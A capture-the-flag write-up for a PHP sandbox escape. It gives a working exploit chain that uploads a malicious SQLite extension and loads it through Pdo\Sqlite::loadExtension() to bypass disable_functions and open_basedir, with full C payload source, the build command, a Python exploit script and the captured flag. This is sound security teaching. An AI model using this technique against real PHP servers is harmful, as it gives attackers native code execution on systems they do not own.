# PHP Sandbox Escape

**Category:** Pwn | **Difficulty:** Hard | **Points:** 158 | **Flag:** `pwnsec{a207a94982215f2e}`

## Challenge Description

> We built a tiny PHP "scripting" service. `disable_functions` blocks every dangerous builtin we could think of, `open_basedir` locks you into `/home/ctf/scripts` and `/tmp`, and there is no shell to be found. You still have arbitrary PHP evaluation via `POST /index.php` with a `cmd` parameter. The real flag is only readable by root through the setuid `/readflag` helper. Escape the sandbox, get native code execution, and read the flag.
>
> — @Rodney98

## What the challenge gives us

The service is about as small as a PHP application can get:

```php
<?php eval($_POST["cmd"]);
```

Anything sent in the POST parameter `cmd` is evaluated as PHP. Normally that
would immediately give us command execution with something like:

```php
system("id");
```

The challenge tries to prevent that in two ways:

1. `disable_functions` contains a very long list of dangerous PHP functions,
   including `system`, `exec`, `shell_exec`, `proc_open`, file-reading
   functions, socket functions, and many others.
2. `open_basedir` limits PHP file access to:

   ```text
   /home/ctf/scripts/
   /tmp
   ```

The flag is supposed to be obtained by executing `/readflag`. This is a small
setuid-root program which opens `/flag` and prints it.

So the actual goal is not to get PHP evaluation—we already have that. The goal
is to turn PHP evaluation into **native code execution**, bypass the PHP
restrictions, and launch `/readflag`.

## The important weakness

While looking at the extensions built into the supplied PHP environment, PDO
and the SQLite PDO driver stood out. Recent PHP versions provide a
driver-specific class named:

```php
Pdo\Sqlite
```

That class has this method:

```php
Pdo\Sqlite::loadExtension()
```

SQLite extensions are native shared libraries—`.so` files on Linux. Loading
one is effectively the same as asking the process to run attacker-supplied C
code.

This slips through the challenge's restrictions for two reasons:

- `disable_functions` disables ordinary PHP **functions by name**. It does not
  disable class methods such as `Pdo\Sqlite::loadExtension()`.
- PHP uploads multipart files into `/tmp`, and `/tmp` is explicitly allowed by
  `open_basedir`.

In other words, we can upload a shared library, obtain its temporary filename
from `$_FILES`, and ask SQLite to load it during the same request.

No PHP memory-corruption exploit is necessary.

## Exploit plan

The full chain is:

1. Compile a malicious SQLite extension as `payload.so`.
2. Upload it with a multipart POST request.
3. PHP stores the upload at a temporary path such as `/tmp/phpABC123`.
4. Create an in-memory SQLite database using `Pdo\Sqlite`.
5. Call `loadExtension()` with the uploaded file's temporary path.
6. The extension registers a new SQLite function named `readflag()`.
7. Run `SELECT readflag()`.
8. The native callback executes `/readflag`, captures its output, and returns
   it as the SQL result.
9. Echo that result into the HTTP response.

The key PHP payload is only three lines:

```php
$db = new Pdo\Sqlite("sqlite::memory:");
$db->loadExtension($_FILES["extension"]["tmp_name"]);
echo $db->query("SELECT readflag()")->fetchColumn();
```

## Building the native extension

The SQLite extension registers a zero-argument SQL function called
`readflag`. When SQLite evaluates that function, our callback creates a pipe,
forks, and directly executes `/readflag` with `execl()`.

Using `execl()` is useful here because it does not rely on PHP's disabled
process functions and does not need a shell.

```c
#include <stddef.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

/* Minimal declarations needed by a loadable SQLite extension. */
typedef struct sqlite3 sqlite3;
typedef struct sqlite3_context sqlite3_context;
typedef struct sqlite3_value sqlite3_value;
typedef struct sqlite3_api_routines sqlite3_api_routines;

extern int sqlite3_create_function_v2(
    sqlite3 *, const char *, int, int, void *,
    void (*)(sqlite3_context *, int, sqlite3_value **),
    void (*)(sqlite3_context *, int, sqlite3_value **),
    void (*)(sqlite3_context *), void (*)(void *));
extern void sqlite3_result_text(sqlite3_context *, const char *, int,
                                void (*)(void *));
extern void sqlite3_result_error(sqlite3_context *, const char *, int);

#define SQLITE_UTF8 1
#define SQLITE_TRANSIENT ((void (*)(void *))-1)

static void run_readflag(sqlite3_context *ctx, int argc, sqlite3_value **argv) {
    (void)argc;
    (void)argv;

    int fds[2];
    char output[512];
    int used = 0;

    if (pipe(fds) != 0) {
        sqlite3_result_error(ctx, "pipe failed", -1);
        return;
    }

    pid_t pid = fork();
    if (pid == 0) {
        close(fds[0]);
        dup2(fds[1], STDOUT_FILENO);
        close(fds[1]);
        execl("/readflag", "readflag", (char *)NULL);
        _exit(127);
    }

    close(fds[1]);

    if (pid < 0) {
        close(fds[0]);
        sqlite3_result_error(ctx, "fork failed", -1);
        return;
    }

    while (used < (int)sizeof(output) - 1) {
        ssize_t n = read(fds[0], output + used,
                         sizeof(output) - 1 - used);
        if (n <= 0) {
            break;
        }
        used += (int)n;
    }

    close(fds[0]);
    waitpid(pid, NULL, 0);
    output[used] = '\0';

    sqlite3_result_text(ctx, output, used, SQLITE_TRANSIENT);
}

__attribute__((visibility("default")))
int sqlite3_extension_init(sqlite3 *db, char **errmsg,
                           const sqlite3_api_routines *api) {
    (void)errmsg;
    (void)api;

    return sqlite3_create_function_v2(
        db,
        "readflag",
        0,
        SQLITE_UTF8,
        NULL,
        run_readflag,
        NULL,
        NULL,
        NULL
    );
}
```

Compile it as a position-independent shared library:

```bash
gcc -O2 -fPIC -shared -Wl,-z,relro,-z,now -o payload.so payload.c
```

The extension deliberately uses only old, common glibc functions, making the
result compatible with the Ubuntu container even when it is compiled on the
provided Kali machine.

## Sending the exploit

The Python script sends both the PHP code and the shared library in one
multipart request:

```python
#!/usr/bin/env python3
import re
import sys
from pathlib import Path

import requests


def main():
    url = sys.argv[1] if len(sys.argv) > 1 else \
        "http://127.0.0.1:8080/index.php"

    payload_path = Path(__file__).resolve().with_name("payload.so")

    php = r'''
$db = new Pdo\Sqlite("sqlite::memory:");
$db->loadExtension($_FILES["extension"]["tmp_name"]);
echo $db->query("SELECT readflag()")->fetchColumn();
'''

    with payload_path.open("rb") as payload:
        response = requests.post(
            url,
            data={"cmd": php},
            files={
                "extension": (
                    "payload.so",
                    payload,
                    "application/octet-stream",
                )
            },
            timeout=15,
        )

    print(response.text, end="")

    match = re.search(r"pwnsec\{[^}\r\n]+\}", response.text)
    if not match:
        raise SystemExit("[-] flag not found in response")

    print(f"[+] flag: {match.group(0)}")


if __name__ == "__main__":
    main()
```

Run it against the remote service:

```bash
python3 solve.py \
  https://CHALLENGE_HOST/index.php
```

The response was:

```text
pwnsec{a207a94982215f2e}
[+] flag: pwnsec{a207a94982215f2e}
```

## Why the setuid helper works

PHP-FPM runs as the unprivileged `ctf` user. Executing `/readflag` is still
enough because the binary has its setuid bit set and is owned by root:

```text
-rwsr-sr-x 1 root root ... /readflag
```

When our native callback launches it, the helper changes its real user and
group IDs to root, opens `/flag`, and writes the flag into our pipe. The parent
process reads the pipe and hands the text back to SQLite.

I also tested the exploit locally after changing `/flag` to mode `0600` and
making it root-owned. It still returned the flag, confirming that the exploit
really used `/readflag` rather than accidentally benefiting from the local
flag's original permissions.

## Takeaway

The giant denylist looked intimidating, but it protected only one layer of the
runtime. PHP functions were restricted; native-code-loading methods were not.

The broad lesson is that `disable_functions` and `open_basedir` are not strong
security boundaries for hostile PHP code. If an attacker can reach an API that
loads native libraries, the restrictions above it become mostly irrelevant.

And, as usual in CTFs, a very long blacklist is often a hint to stop reading
the blacklist line by line and look for an entirely different route around it.
